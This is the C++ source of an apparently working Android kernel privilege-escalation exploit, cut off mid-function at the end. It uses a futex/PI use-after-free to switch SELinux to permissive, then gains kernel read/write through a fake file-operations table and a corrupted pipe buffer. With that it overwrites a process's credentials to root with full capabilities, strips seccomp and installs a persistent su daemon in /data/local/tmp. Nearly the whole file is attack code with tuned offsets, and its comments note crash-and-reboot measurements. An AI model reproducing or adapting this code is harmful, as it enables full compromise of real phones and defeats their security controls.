//
// Created by Anakin on 2026-11-01.
//

#include "root_stage.h"
#include "futex_probe.h"
#include <atomic>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/prctl.h>
#include <pthread.h>
#include "leak_probe.h"
#include "aliases.h"
#include "page_engine.h"
#include "pipe_phys.h"
#include "su_blob.h"

#include <android/log.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <unistd.h>

#include <cerrno>
#include <cstdarg>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <string>
#include <vector>

// Pull in the su daemon code for the in-process fallback (su_daemon_inproc)
extern "C" {
#include "su/su_daemon.c"
}

#define LOG_TAG "oplus_ace5"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

#define SU_PATH   "/data/local/tmp/su"
#define SOCK_PATH "/data/local/tmp/.oplus_su.sock"

#ifdef OPLUS_ONECLICK
int glshell_entry(void);
#endif

namespace {

int g_status_fd = -1;
int g_trace_fd = -1;
int g_trace_fd2 = -1;
char g_engine_path[512] = "";
/* Mirror copy: the app's own data dir vanished once across a panic reboot, and
 * adb cannot read it at all once the package is gone. /data/local/tmp is
 * readable from a shell, so the log survives the run either way. Only opens
 * once stage 1 has made SELinux permissive; until then it stays -1. */
int g_status_fd2 = -1;

long now_ms() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);   // vDSO: never enters the kernel
    return (long) (ts.tv_sec * 1000 + ts.tv_nsec / 1000000);
}

/* The status file is the only channel back to the UI: the child is detached and
 * its stdout goes nowhere. Held on an fd above 319 so the paint's dup2 loop
 * cannot clobber it. */
void status(const char *fmt, ...) {
    char line[1024];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(line, sizeof(line) - 2, fmt, ap);
    va_end(ap);
    if (n < 0) return;
    if (n > (int) sizeof(line) - 2) n = (int) sizeof(line) - 2;
    line[n++] = '\n';
    line[n] = 0;
    for (int fd: {g_status_fd, g_status_fd2}) {
        if (fd < 0) continue;
        ssize_t w = write(fd, line, (size_t) n);
        (void) w;
        fsync(fd);
    }
    LOGI("%s", line);
}

void write_str_file(const char *path, const char *val) {
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) {
        status("  %s: open errno=%d", path, errno);
        return;
    }
    ssize_t w = write(fd, val, strlen(val));
    close(fd);
    status("  %s <- %s (%zd)", path, val, w);
}

void log_round(const char *tag, const GlRoundCfg &cfg, const GlRoundOut &o) {
    status("%s: bug_path=%d requeue=%ld/%d observed=%d fires=%d nice=%d cpu=%d/%d delay_ns=%llu",
           tag, (int) o.bug_path, o.requeue_ret, o.requeue_errno,
           (int) o.observed, o.fires, cfg.fire_nice,
           cfg.waiter_cpu, cfg.fire_cpu,
           (unsigned long long) cfg.fire_delay_ns);
}

/* Written the instant the canvas goes live and before the consumer is released,
 * so the numbers survive the panic. `pselect`'s return is the ready-fd count and
 * therefore encodes FDS_BYTES(n): 172/173 for stage1a means n==320 with five
 * words per set, and anything else means max_fds clamped n and every word index
 * in the paint map is wrong. */
/* Fires only on a canvas that actually holds what we painted. res_ex[3] is the
 * tell: we paint VALUE into the ex[] input word 3, and the kernel copies res_ex
 * back over it, so a non-zero readback means pselect returned before the
 * copy-back and the kernel-side canvas was never written. Must stay free of I/O
 * -- it runs between the paint and the consumer's first fire, a window measured
 * in single-digit milliseconds. */
int canvas_check(const GlRoundOut *, void *) { return 1; }

/* This process holds a thread whose pi_blocked_on dangles into its own kernel
 * stack and which the chain never clears. Thread exit re-enters the PI
 * machinery on that pointer, so the process has to outlive everything: drop out
 * of lmkd's reach and out of the app's cgroup so a force-stop of the UI cannot
 * take it with it. */
void harden_self(void) {
    write_str_file("/proc/self/oom_score_adj", "-1000");
    static const char *roots[] = {
            "/dev/cpuctl/tasks",
            "/dev/cpuset/tasks",
            "/dev/stune/tasks",
            "/sys/fs/cgroup/tasks",
    };
    char pid[16];
    snprintf(pid, sizeof(pid), "%d", (int) getpid());
    for (const char *r: roots) {
        int fd = open(r, O_WRONLY | O_CLOEXEC);
        if (fd < 0) continue;
        ssize_t w = write(fd, pid, strlen(pid));
        close(fd);
        status("  cgroup %s <- %s (%zd, errno=%d)", r, pid, w, w < 0 ? errno : 0);
    }
}

bool install_su(void) {
    int fd = open(SU_PATH, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
    if (fd < 0) {
        status("install su: open errno=%d", errno);
        return false;
    }
    size_t off = 0;
    while (off < SU_BLOB_LEN) {
        ssize_t n = write(fd, SU_BLOB + off, SU_BLOB_LEN - off);
        if (n < 0 && errno == EINTR) continue;
        if (n <= 0) {
            status("install su: write errno=%d at %zu", errno, off);
            close(fd);
            return false;
        }
        off += (size_t) n;
    }
    fsync(fd);
    close(fd);
    chmod(SU_PATH, 0755);
    chown(SU_PATH, 0, 0);
    status("installed %s (%u bytes)", SU_PATH, SU_BLOB_LEN);
    return true;
}

void start_daemon(void) {
    pid_t p = fork();
    if (p == 0) {
        setsid();
        // The exploit child blocks every catchable signal; the daemon is a
        // normal long-lived process and needs the default mask back.
        sigset_t none;
        sigemptyset(&none);
        pthread_sigmask(SIG_SETMASK, &none, nullptr);
        signal(SIGPIPE, SIG_DFL);
        int lf = open("/data/local/tmp/oplus_su_daemon.log",
                      O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
        if (lf >= 0) {
            dup2(lf, STDOUT_FILENO);
            dup2(lf, STDERR_FILENO);
            if (lf > STDERR_FILENO) close(lf);
        }
        execl(SU_PATH, "su", "--daemon", (char *) NULL);
        /* Payload preload.c run_su_daemon_direct model: execl returned =
         * exec blocked (seccomp). Run the daemon IN-PROCESS, no exec. */
        dprintf(STDERR_FILENO, "su daemon: execl failed errno=%d, fallback\n", errno);
        _exit(su_daemon_inproc());
    }
    status("daemon forked pid=%d", (int) p);
}

/* Runs on the round-2 root thread, the only task whose cred pointer the write
 * changed. It is not the canvas owner, so it may syscall freely; everything it
 * needs to persist ends in a fork, and the daemon itself is a separate, clean,
 * restartable process. */
void post_root(void *) {
    /* NO setresuid here: the cred fire's collateral store lands at
     * AL_INIT_CRED+0x10 (suid/sgid), and setresuid(0,0,0) over the
     * corrupted init_cred kills the kernel instantly -- measured twice:
     * status ends at "parking", post_root's first line never appears.
     * real_cred is repaired by its own constrained write instead (see the
     * real_cred fire loop in child_main). uid is already 0 from the cred
     * write itself. */
    status("ROOT uid=%d euid=%d gid=%d pid=%d", getuid(), geteuid(), getgid(),
           (int) getpid());

    /* /data/local/tmp is drwxrwx--x shell shell, so an app uid cannot create a
     * file there even with SELinux permissive -- DAC still applies. The mirror
     * log therefore only opens once we are root; it is what makes the run
     * diagnosable from adb afterwards. */
    int mfd = open("/data/local/tmp/gl_status.txt",
                   O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0666);
    if (mfd >= 0) {
        int hi = fcntl(mfd, F_DUPFD, 2000);
        close(mfd);
        g_status_fd2 = hi;
    }

    harden_self();
    if (install_su()) start_daemon();
}

void park(void);

void park(void) {
    for (;;) pause();
}

char g_lock_path[512];

/* Sibling of status_path in the same directory. */
void sibling_path(const char *status_path, const char *name, char *out, size_t n) {
    snprintf(out, n, "%s", status_path);
    char *slash = strrchr(out, '/');
    if (slash) *(slash + 1) = 0;
    else out[0] = 0;
    strncat(out, name, n - strlen(out) - 1);
}

bool child_alive(void) {
    int fd = open(g_lock_path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return false;
    char b[32];
    memset(b, 0, sizeof(b));
    ssize_t n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return false;
    int pid = atoi(b);
    return pid > 0 && kill(pid, 0) == 0;
}

/* Zero-lock slots must never be shared between processes. rb_add_cached leaves
 * the waiter pointer in lock->waiters, and once that process's canvas thread
 * exits its vmap stack is unmapped -- a later process firing on the same slot
 * then reads rb_leftmost and dereferences a freed stack (chain+0x1ec,
 * `ldr x8,[x27,#0x38]`, "Unable to handle kernel paging request"). Advance a
 * persisted sequence so consecutive runs get disjoint slot ranges. */
int next_slot_base(void) {
    /* Slot generation from CLOCK_MONOTONIC seconds: monotonic within a boot
     * (/proc/uptime is unreadable for untrusted_app under enforcing SELinux --
     * measured gen=0 -> fixed slots -> the shared-slot panics again)
     * (runs are >= 200s apart, so consecutive runs never collide) and it
     * resets across reboots, where the stale slot contents die with RAM.
     * The previous file-based sequence lived in the app data dir, which
     * OPLUS wipes after a crash reboot -- every cycle restarted at gen=96
     * and shared slots 112..136 with the previous crashed run, which is
     * exactly the cross-process stale-walker sharing the alias comment
     * forbids (measured: ~50-70% panic per fire while it lasted).
     * Window: 5280 slots past AL_ZERO_LOCK; keep base+48 < 5000. */
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (int) (ts.tv_sec % 4800);
}

/* setprocattr is exactly the call that returned EINVAL while
 * selinux_state.initialized held a non-canonical _Bool, so its errno is a
 * direct observable for whether the repair write landed. Run in a throwaway
 * child: it re-applies our own context, so success is a no-op, and a fork has
 * no stale pi_blocked_on and may exit freely. */
int probe_setcon(void) {
    char cur[128];
    memset(cur, 0, sizeof(cur));
    int rfd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
    if (rfd < 0) return -1;
    ssize_t n = read(rfd, cur, sizeof(cur) - 1);
    close(rfd);
    if (n <= 0) return -1;
    while (n > 0 && (cur[n - 1] == '\n' || cur[n - 1] == '\0')) cur[--n] = 0;

    int wfd = open("/proc/self/attr/current", O_WRONLY | O_CLOEXEC);
    if (wfd < 0) return errno;
    ssize_t w = write(wfd, cur, strlen(cur) + 1);
    int e = (w < 0) ? errno : 0;
    close(wfd);
    return e;
}


/* One round, one process. Across six builds the first round in a process landed
 * reliably while later rounds in the same process intermittently fired on a
 * canvas whose lock word had turned into a userspace pointer, even though the
 * fdset readback still matched and the canvas owner made no syscall in between.
 * A single-round process is also the configuration the proven standalone binary
 * uses, so each stage gets its own fork and the coordinator -- which holds no
 * poisoned thread -- sequences them and is free to exit. */
/* All three rounds in one process, in the exact shape of the only build that
 * has completed them (single paint, consumer firing 5 ms after paint_live, no
 * signal mask, no repainting, no validation gate between paint and fire). The
 * one addition is the post-round neutralize + FUTEX_UNLOCK_PI, which is what
 * that build was missing and why it rebooted after reporting uid=0. */
void child_main(void) {
    signal(SIGPIPE, SIG_IGN);
    /* src61 set_limit: fd table must hold 320 dup'd descriptors at rlim_max;
     * the inherited app soft limit can silently clamp nfds inside pselect. */
    {
        struct rlimit r;
        if (getrlimit(RLIMIT_NOFILE, &r) == 0 && r.rlim_cur < r.rlim_max) {
            r.rlim_cur = r.rlim_max;
            setrlimit(RLIMIT_NOFILE, &r);
        }
        if (getrlimit(RLIMIT_NPROC, &r) == 0 && r.rlim_cur < r.rlim_max) {
            r.rlim_cur = r.rlim_max;
            setrlimit(RLIMIT_NPROC, &r);
        }
    }
    /* Block every catchable signal before any thread is created, so all of them
     * inherit the mask. Signal delivery is the one remaining way to put a kernel
     * frame on the canvas owner's stack between the paint and a fire, and the
     * frame lands exactly where the painted words are. The readback in a failing
     * run is byte-identical to a succeeding one, so the canvas is written
     * correctly and then lost -- not misplaced. */
    sigset_t all;
    sigfillset(&all);
    sigdelset(&all, SIGKILL);
    sigdelset(&all, SIGSTOP);
    pthread_sigmask(SIG_SETMASK, &all, nullptr);

    /* The app launch fires OPLUS's scheduler-boost burst at the whole uid:
     * dozens of sched_setattr in the first ~2s. Any one of them landing while
     * a poisoned thread is parked in its 30ms WAIT_REQUEUE_PI walks
     * pi_blocked_on into the live frame's q.key (a USER pointer) and reboots
     * the phone. Sit the burst out before arming anything. */
    usleep(3000000);
    status("=== exploit child pid=%d uid=%d ===", (int) getpid(), getuid());

    /* Fresh zero-lock slots for every fire of this process (the alias
     * contract: rb_add_cached leaves the waiter pointer in lock->waiters,
     * which outlives the process that painted it -- a later fire on the
     * same slot walks that stale, freed vmap-stack pointer and panics.
     * The fixed slots 16/24/32/40/48 used by every earlier build violated
     * this: measured 0/10 landings on the reused slot-48 cred fire while
     * VALUE=0/1/3 fires survived (their erase never dereferences the stale
     * leftmost). next_slot_base() advances the persisted sequence so each
     * process gets a disjoint [gen, gen+96) block. */
    int slot_gen = next_slot_base();
    status("slot_gen=%d", slot_gen);

    if (perf_open_works()) {
        status("stage1 skipped: perf_event_open already permitted");
    } else {
        GlRoundCfg c1{};
        c1.trace_fd = g_trace_fd; c1.trace_fd2 = g_trace_fd2;
        c1.target = AL_SELINUX_STATE;
        c1.value = AL_SELINUX_VALUE;
        c1.lock_addr = AL_ZERO_LOCK + (slot_gen + 16) * ZERO_LOCK_STRIDE;
        c1.wait = GlWait::PerfOpen;
        c1.wait_timeout_ms = 5000;
        GlRoundOut o1 = gl_round(c1);
        log_round("stage1a", c1, o1);
        if (!o1.bug_path) {
            status("ABORT stage1a: no UAF (%s)", o1.note.c_str());
            park();
        }
        if (!o1.observed) {
            status("ABORT stage1a: selinux_state.enforcing write did not take");
            park();
        }
        status("stage1a OK: SELinux permissive. App spawning is broken until 1b lands.");
        /* (kprobe Plan-B instrumentation removed: the tracingfs writes
         * always failed EACCES and the audit/softirq churn they trigger
         * lands exactly in the fragile pre-1b window.) */

        /* enforcing is down but `initialized` is now 0x08, which this
         * LTO+PGO+BOLT kernel reads as false and answers every setprocattr with
         * EINVAL -- zygote aborts and system_server crash-loops. Repair it at
         * once; the gap between these two rounds is the only window in which the
         * framework is unusable. */
        GlRoundCfg c1b{};
        c1b.trace_fd = g_trace_fd; c1b.trace_fd2 = g_trace_fd2;
        c1b.target = AL_SELINIT_STATE;
        c1b.value = AL_SELINIT_VALUE;
        c1b.lock_addr = AL_ZERO_LOCK + (slot_gen + 24) * ZERO_LOCK_STRIDE;
        c1b.wait = GlWait::None;
        c1b.wait_timeout_ms = 2000;
        GlRoundOut o1b = gl_round(c1b);
        log_round("stage1b", c1b, o1b);
        if (!o1b.bug_path) {
            status("ABORT stage1b: no UAF (%s) -- reboot to restore the framework",
                   o1b.note.c_str());
            park();
        }
        status("stage1b done: selinux_state.initialized restored to 1");
    }
    status(">> stage1 complete, next: stage2");

    /* ── fake-page fire stage (hybrid: engine leaked+reclaimed, we fire) ──
     * The engine (glshell) runs the leak + reclaim in the shell domain and
     * parks holding the skb pages. It hands the four paint words over in a
     * file. The canvas+dance+fire runs HERE: the app-context pselect canvas
     * is the geometry that actually lands on this device (measured: engine
     * fires walk stale bytes every time -- frame position drifts; app
     * context landed 100% through the SELinux rounds). */
    {
        static constexpr size_t T_TASKS_OFF = 0x550;
        static constexpr size_t T_PID_OFF   = 0x630;
        static constexpr size_t T_REAL_CRED = 0x830;
        static constexpr size_t T_CRED      = 0x838;
        static constexpr size_t T_SECCOMP   = 0x900;
        const char *val_path = getenv("GL_VALUES_PATH");
        if (!val_path || !val_path[0])
            val_path = "/data/local/tmp/gl_page_values.txt";
        uint64_t kaslr = 0, fake_fops = 0, misc_alias = 0, fake_task = 0,
                 fake_lock = 0, boot_tag = 0;
        bool ready = false;
        int vfd = open(val_path, O_RDONLY);
        if (vfd >= 0) {
            char vb[512];
            ssize_t n = read(vfd, vb, sizeof(vb) - 1);
            close(vfd);
            if (n > 0) {
                vb[n] = 0;
                uint64_t my_boot = 0;
                {
                    char b[64] = {0};
                    int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
                    if (fd >= 0) { (void)! read(fd, b, sizeof(b) - 1); close(fd); }
                    my_boot = strtoull(b, nullptr, 16);
                }
                unsigned long long k, f, m, t, l, bt;
                if (strstr(vb, "READY") &&
                    sscanf(vb, "boot=%llx kaslr=%llx fops=%llx misc=%llx "
                               "task=%llx lock=%llx", &bt, &k, &f, &m, &t,
                           &l) == 6 &&
                    bt == my_boot) {
                    boot_tag = bt;
                    kaslr = k; fake_fops = f; misc_alias = m;
                    fake_task = t; fake_lock = l;
                    ready = true;
                } else if (strstr(vb, "READY")) {
                    /* values from a previous boot: firing at them panics
                     * the kernel (measured). Ignore and exit like the
                     * no-engine flow; the engine rewrites the file with
                     * this boot's stamp. */
                    status("stale values ignored (boot tag mismatch)");
                }
            }
        }
        if (!ready) {
            /* No engine handoff in this boot: the old flow -- stage1 only,
             * glshell owns everything else. */
            status("stage1 complete; child exits");
            _exit(0);
        }
        status("values: kaslr=%016llx fops=%016llx task=%016llx lock=%016llx",
               (unsigned long long) kaslr, (unsigned long long) fake_fops,
               (unsigned long long) fake_task, (unsigned long long) fake_lock);
        pe::set_kaslr_base(kaslr);
        pe::adopt_page(fake_fops, fake_lock, fake_task);

        int rwfd = -1;

        /* PLF110 cannot use the Pixel TCP_ZEROCOPY_RECEIVE canvas: its vendor
         * do_tcp_getsockopt() has a 0x290-byte frame (Pixel is roughly 0x120),
         * placing the copied zc control block 0x170 bytes below the stale
         * rt_mutex_waiter.  Use the already calibrated 32-bit GL pselect
         * canvas instead.  Fire exactly once: a successful walk links a live
         * stack waiter into fake_lock->waiters, so reusing this fake lock for
         * another fire would follow a stale rb child and panic. */
        static constexpr size_t kLockOffsets[] = {
                0x1350, 0x1120, 0x11b0, 0x1240, 0x12c8
        };
            /* nice 9/10/11 straddle static_prio 129/130/131 around the
             * painted waiter's prio=130.  Keep nice=1 as the known upstream
             * baseline while giving each fresh lock a genuinely distinct
             * rb-tree ordering instead of repeating the same shot. */
            static constexpr int kFireNice[] = {11, 1, 1, 1, 1};
            /* The boot_id quality write on PLF110 is repeatably successful
             * with waiter/fire on the prime 6/7 pair.  Keep that proven CPU
             * topology for all fops shots and only scan the sub-us edge. */
            static constexpr int kWaiterCpu[] = {6, 6, 6, 6, 6};
            static constexpr int kFireCpu[] = {7, 7, 7, 7, 7};
            static constexpr int kOwnerCpu[] = {0, 0, 0, 0, 0};
            static constexpr uint64_t kFireDelayNs[] = {0, 0, 250, 500, 1000};
            uint64_t page = fake_fops - 0x1000;
            for (size_t attempt = 0;
                 attempt < sizeof(kLockOffsets) / sizeof(kLockOffsets[0]) && rwfd < 0;
                 attempt++) {
            GlRoundCfg cf{};
            cf.trace_fd = g_trace_fd; cf.trace_fd2 = g_trace_fd2;
            cf.value = fake_fops;
            cf.target = misc_alias;
            /* PLF110 known-landed route: handoff carries AL_INIT_TASK. */
            cf.task_addr = fake_task;
            cf.lock_addr = page + kLockOffsets[attempt];
            cf.fire_nice = kFireNice[attempt];
            cf.waiter_cpu = kWaiterCpu[attempt];
            cf.fire_cpu = kFireCpu[attempt];
            cf.owner_cpu = kOwnerCpu[attempt];
            cf.fire_delay_ns = kFireDelayNs[attempt];
            cf.wait = GlWait::None;
            cf.wait_timeout_ms = 3000;
            GlRoundOut of = gl_round(cf);
            log_round("stage2fp(single)", cf, of);
            if (of.bug_path) rwfd = pe::try_rw();
            status("stage2fp[%zu]: lock=%016llx bug_path=%d observed=%d rwfd=%d",
                   attempt, (unsigned long long) cf.lock_addr,
                   (int) of.bug_path, (int) of.observed, rwfd);
        }
        if (rwfd < 0) {
            status("ABORT stage2fp: one-shot fops swap/RW verification failed");
            park();
        }
        if (rwfd < 0) {
            park();
        }
        status("R/W armed fd=%d", rwfd);

        auto restore_misc_fops = [&]() {
            bool ok = pe::kernel_write64(
                pe::get_misc_fops_alias(),
                pe::get_kaslr_base() + pe::get_ashmem_fops_img_off());
            status("miscdevice.fops emergency restore=%d", static_cast<int>(ok));
            return ok;
        };

        /* Repair slots overwritten by the live mm_struct sharing the fake
         * page.  In particular flush@+0x78 must be NULL before pipe setup
         * forks helpers; otherwise their inherited ashmem fd crashes in
         * filp_close() when the helpers exit. */
        if (!pe::refresh_fake_fops_text()) {
            status("ABORT stage2fp: fake fops refresh failed");
            restore_misc_fops();
            park();
        }
        status("fake fops refreshed; flush sanitized before pipe fork");

        /* Upstream does not use configfs directly on task_struct/cred.  It
         * first corrupts a real pipe_buffer and turns pipe read/write into a
         * page-based primitive, which avoids the SLUB usercopy whitelist. */
        if (!pe::install_pipe_physrw()) {
            status("ABORT stage2fp: pipe physical R/W install/self-test failed");
            restore_misc_fops();
            park();
        }
        status("pipe physical R/W armed and scratch-verified");

        int child_go[2] = {-1, -1};
        int child_report[2] = {-1, -1};
        if (pipe2(child_go, O_CLOEXEC) != 0 ||
            pipe2(child_report, O_CLOEXEC) != 0) {
            status("ABORT stage2fp: root child pipes errno=%d", errno);
            restore_misc_fops();
            park();
        }
        pid_t root_child = fork();
        if (root_child == 0) {
            close(child_go[1]);
            close(child_report[0]);
            prctl(PR_SET_NAME, "gl_root_child", 0, 0, 0);
            uid_t original_app_uid = getuid();
            char go = 0;
            if (read(child_go[0], &go, 1) != 1) _exit(120);
            close(child_go[0]);

            errno = 0;
            int gid_rc = setgid(0);
            int gid_errno = errno;
            errno = 0;
            int uid_rc = setuid(0);
            int uid_errno = errno;
            struct {
                int uid, euid, gid, egid;
                int uid_rc, uid_errno, gid_rc, gid_errno;
            } report{static_cast<int>(getuid()), static_cast<int>(geteuid()),
                     static_cast<int>(getgid()), static_cast<int>(getegid()),
                     uid_rc, uid_errno, gid_rc, gid_errno};
            (void)!write(child_report[1], &report, sizeof(report));
            close(child_report[1]);
            if (report.uid != 0 || report.euid != 0) _exit(121);

            char app_uid_buf[32];
            snprintf(app_uid_buf, sizeof(app_uid_buf), "%u",
                     static_cast<unsigned>(original_app_uid));
            setenv("OPLUS_SU_APP_UID", app_uid_buf, 1);
            post_root(nullptr);  // installs /data/local/tmp/su and starts daemon
            pid_t proof = fork();
            if (proof == 0) {
                int out = open("/data/local/tmp/root_proof.txt",
                               O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
                if (out >= 0) {
                    dup2(out, STDOUT_FILENO);
                    dup2(out, STDERR_FILENO);
                    if (out > STDERR_FILENO) close(out);
                }
                execl("/system/bin/sh", "sh", "-c",
                      "/system/bin/id; /system/bin/whoami", (char *) nullptr);
                _exit(127);
            }
            int proof_status = 0;
            while (waitpid(proof, &proof_status, 0) < 0 && errno == EINTR) {}
            status("=== ROOT CHILD DONE proof_status=%d daemon forked; parking ===",
                   proof_status);
            park();
        }
        close(child_go[0]);
        close(child_report[1]);
        if (root_child <= 0) {
            status("ABORT stage2fp: fork root child errno=%d", errno);
            restore_misc_fops();
            park();
        }

        auto direct_ptr = [](uint64_t p) {
            return p >= LINEAR_MAP_BASE && p < 0xffffff9000000000ULL &&
                   (p & 7) == 0;
        };
        auto pread64 = [](uint64_t address) { return pe::phys_read64(address); };

        /* Walk init_task.tasks and patch only the dedicated root child. */
        uint64_t child_task = 0;
        uint64_t node = AL_INIT_TASK + T_TASKS_OFF;
        for (int i = 0; i < 8192; ++i) {
            uint64_t next = pread64(node);
            if (!direct_ptr(next)) break;
            uint64_t task = next - T_TASKS_OFF;
            uint32_t pid = ~0u;
            if (!pe::phys_read(task + T_PID_OFF, &pid, sizeof(pid))) break;
            if (pid == static_cast<uint32_t>(root_child)) {
                child_task = task;
                break;
            }
            node = next;
        }
        if (!child_task) {
            status("ABORT stage2fp: root child task not found pid=%d",
                   static_cast<int>(root_child));
            restore_misc_fops();
            park();
        }
        status("root child task=%016llx pid=%d",
               static_cast<unsigned long long>(child_task),
               static_cast<int>(root_child));

        static constexpr size_t CRED_UID_OFF = 0x04;
        static constexpr size_t CRED_SECUREBITS_OFF = 0x24;
        static constexpr size_t CRED_CAPS_OFF = 0x28;
        static constexpr size_t CRED_SECURITY_OFF = 0x78;
        static constexpr size_t T_ATOMIC_FLAGS = 0x5f0;
        static constexpr uint64_t CAP_FULL = 0x000001ffffffffffULL;
        static constexpr uint64_t IMG_SELINUX_BLOB_SIZES = 0x156d8a0ULL;
        uint32_t selinux_cred_blob_off = 0;
        (void)pe::phys_read(LINEAR_MAP_BASE + IMG_SELINUX_BLOB_SIZES,
                            &selinux_cred_blob_off,
                            sizeof(selinux_cred_blob_off));

        auto patch_cred = [&](uint64_t cred) {
            if (!direct_ptr(cred)) return false;
            uint32_t zero_ids[8] = {};
            uint32_t zero32 = 0;
            uint64_t caps[5] = {CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL};
            if (!pe::phys_write(cred + CRED_UID_OFF, zero_ids, sizeof(zero_ids)) ||
                !pe::phys_write(cred + CRED_SECUREBITS_OFF, &zero32, sizeof(zero32)) ||
                !pe::phys_write(cred + CRED_CAPS_OFF, caps, sizeof(caps))) return false;

            uint64_t security = pe::phys_read64(cred + CRED_SECURITY_OFF);
            if (!direct_ptr(security)) return false;
            uint32_t kernel_sid[2] = {1, 1};
            if (!pe::phys_write(security + selinux_cred_blob_off,
                                kernel_sid, sizeof(kernel_sid))) return false;
            uint32_t uid = ~0u, euid = ~0u;
            return pe::phys_read(cred + 0x04, &uid, sizeof(uid)) &&
                   pe::phys_read(cred + 0x14, &euid, sizeof(euid)) &&
                   uid == 0 && euid == 0;
        };

        uint64_t real_cred = pe::phys_read64(child_task + T_REAL_CRED);
        uint64_t cred = pe::phys_read64(child_task + T_CRED);
        if (!patch_cred(cred) ||
            (real_cred != cred && !patch_cred(real_cred))) {
            status("ABORT stage2fp: root child cred patch failed real=%016llx cred=%016llx",
                   static_cast<unsigned long long>(real_cred),
                   static_cast<unsigned long long>(cred));
            restore_misc_fops();
            park();
        }

        uint64_t tif = pe::phys_read64(child_task);
        uint64_t atomic_flags = pe::phys_read64(child_task + T_ATOMIC_FLAGS);
        uint64_t zero64 = 0;
        uint32_t zero32 = 0;
        tif &= ~(1ULL << 11);          // TIF_SECCOMP
        atomic_flags &= ~(1ULL << 0);  // PFA_NO_NEW_PRIVS
        if (!pe::phys_write64(child_task, tif) ||
            !pe::phys_write64(child_task + T_ATOMIC_FLAGS, atomic_flags) ||
            !pe::phys_write(child_task + T_SECCOMP + 0x00, &zero32, sizeof(zero32)) ||
            !pe::phys_write(child_task + T_SECCOMP + 0x04, &zero32, sizeof(zero32)) ||
            !pe::phys_write(child_task + T_SECCOMP + 0x08, &zero64, sizeof(zero64))) {
            status("ABORT stage2fp: root child seccomp patch failed");
            restore_misc_fops();
            park();
        }

        /* New opens must stop inheriting the fake table before the root child
         * starts the daemon.  The already-open configfs fd remains usable. */
        bool fops_restored = pe::kernel_write64(
            pe::get_misc_fops_alias(),
            pe::get_kaslr_base() + pe::get_ashmem_fops_img_off());
        status("miscdevice.fops restore=%d", static_cast<int>(fops_restored));
        if (!fops_restored) park();

        char go = 1;
        if (write(child_go[1], &go, 1) != 1) {
            status("ABORT stage2fp: root child release errno=%d", errno);
            park();
        }
        close(child_go[1]);
        struct {
            int uid, euid, gid, egid;
            int uid_rc, uid_errno, gid_rc, gid_errno;
        } report{};
        ssize_t report_len = read(child_report[0], &report, sizeof(report));
        close(child_report[0]);
        status("root child report n=%zd uid=%d euid=%d gid=%d egid=%d "
               "setuid=%d/%d setgid=%d/%d",
               report_len, report.uid, report.euid, report.gid, report.egid,
               report.uid_rc, report.uid_errno, report.gid_rc, report.gid_errno);
        if (report_len != static_cast<ssize_t>(sizeof(report)) ||
            report.uid != 0 || report.euid != 0) park();
        status("=== ROOT HANDOFF COMPLETE; waiting for su daemon ===");
        park();
    }
}

int daemon_query(char mode, char *out, size_t outlen, int timeout_ms) {
    int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (fd < 0) return -1;
    struct sockaddr_un sun;
    memset(&sun, 0, sizeof(sun));
    sun.sun_family = AF_UNIX;
    snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", SOCK_PATH);

    struct timeval tv{(long) (timeout_ms / 1000), (long) ((timeout_ms % 1000) * 1000)};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(fd, (struct sockaddr *) &sun, sizeof(sun)) != 0) {
        close(fd);
        return -1;
    }
    if (mode == 'S') {
        if (write(fd, &mode, 1) != 1) { close(fd); return -1; }
        shutdown(fd, SHUT_WR);
        ssize_t n = read(fd, out, outlen - 1);
        close(fd);
        if (n <= 0) return -1;
        out[n] = 0;
        return (int) n;
    }

    const char *cmd = out;   // in/out: caller passes the command in `out`
    uint32_t len = (uint32_t) strlen(cmd);
    char hdr[5];
    hdr[0] = 'C';
    memcpy(hdr + 1, &len, 4);
    if (write(fd, hdr, 5) != 5) { close(fd); return -1; }
    size_t off = 0;
    while (off < len) {
        ssize_t w = write(fd, cmd + off, len - off);
        if (w <= 0) { if (errno == EINTR) continue; close(fd); return -1; }
        off += (size_t) w;
    }
    shutdown(fd, SHUT_WR);

    std::string acc;
    char buf[4096];
    for (;;) {
        ssize_t n = read(fd, buf, sizeof(buf));
        if (n < 0 && errno == EINTR) continue;
        if (n <= 0) break;
        acc.append(buf, (size_t) n);
    }
    close(fd);
    snprintf(out, outlen, "%s", acc.c_str());
    return (int) acc.size();
}

}  // namespace

#ifdef OPLUS_ONECLICK
static bool oneclick_file_contains(const char *path, const char *needle) {
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return false;
    char buf[8192];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return false;
    buf[n] = 0;
    return strstr(buf, needle) != nullptr;
}

static bool oneclick_enforcing() {
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    if (fd < 0) return true;
    char value = '1';
    (void)!read(fd, &value, 1);
    close(fd);
    return value == '1';
}

static pid_t oneclick_spawn_engine(const char *phase) {
    pid_t pid = fork();
    if (pid != 0) return pid;
    prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
